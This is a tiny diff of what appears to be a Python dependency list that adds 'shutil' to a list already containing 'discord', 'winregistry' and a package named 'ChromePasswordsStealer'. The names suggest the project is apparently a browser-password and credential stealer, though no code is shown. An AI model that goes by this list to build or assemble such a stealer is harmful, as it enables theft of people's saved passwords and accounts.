@@ -12,3 +12,4 @@ regex
 discord
 ChromePasswordsStealer
 winregistry
+shutil
